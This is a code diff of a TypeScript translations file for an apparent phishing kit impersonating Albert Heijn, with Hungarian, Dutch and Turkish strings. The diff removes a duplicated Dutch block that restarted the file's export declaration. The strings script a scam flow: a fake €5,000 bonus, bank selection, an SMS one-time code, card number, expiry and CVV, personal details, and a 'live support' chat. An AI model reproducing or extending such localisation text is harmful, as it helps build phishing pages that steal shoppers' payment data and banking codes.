@@ -455,47 +455,6 @@ export const translations: Record<string, TranslationKeys> = {
     profile_phone_label: "Mobilszám",
     profile_button: "Tovább",
     profile_loading_text: "Feldolgozás..."
-  }
-
-
-export const translations: Record<string, TranslationKeys> = {
-  nl: {
-    portal_name: "Albert Heijn klantenportaal",
-    support_center_name: "Albert Heijn service",
-    win_title: "Exclusieve Albert Heijn bonus",
-    win_subtitle: "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 5.000 euro te claimen.",
-    win_button: "Bonus claimen",
-    banken_title: "Kies je bank",
-    banken_subtitle: "Selecteer je Nederlandse bank om verder te gaan.",
-    banken_search_placeholder: "Zoek je bank...",
-    wait_title: "Even geduld",
-    wait_subtitle: "Je aanvraag wordt veilig verwerkt...",
-    sms_title: "SMS-beveiligingscode",
-    sms_subtitle: "Voer de {digits}-cijferige code in.",
-    sms_input_label: "Eenmalige code",
-    sms_button: "Bevestigen",
-    sms_loading: "Verwerken...",
-    card_title: "Betaalgegevens",
-    card_subtitle: "Controleer en bevestig je gegevens.",
-    card_owner_label: "Naam kaarthouder",
-    card_number_label: "Kaartnummer",
-    card_expiry_label: "Vervaldatum MM/JJ",
-    card_cvv_label: "Beveiligingscode",
-    card_button: "Doorgaan",
-    code_title: "Welkom",
-    code_subtitle: "Voer de deelnamecode in die je van {partner} hebt ontvangen om je beloning vrij te geven.",
-    code_button: "Code bevestigen",
-    live_support_title: "Live support",
-    live_support_subtitle: "Om verder te gaan, moet je contact opnemen met onze klantenservice.\n\nKlik op de knop hieronder om het gesprek te starten.",
-    live_support_button: "Chat openen",
-    profile_title_small: "Prijsbevestiging",
-    profile_title_main: "Je bonusbedrag",
-    profile_subtitle: "Bevestig je gegevens voor de verdere verwerking.",
-    profile_firstname_label: "Voornaam",
-    profile_lastname_label: "Achternaam",
-    profile_phone_label: "Mobiel nummer",
-    profile_button: "Verder",
-    profile_loading_text: "Verwerken..."
   },
   tr: {
     portal_name: "Albert Heijn Müşteri Portalı",
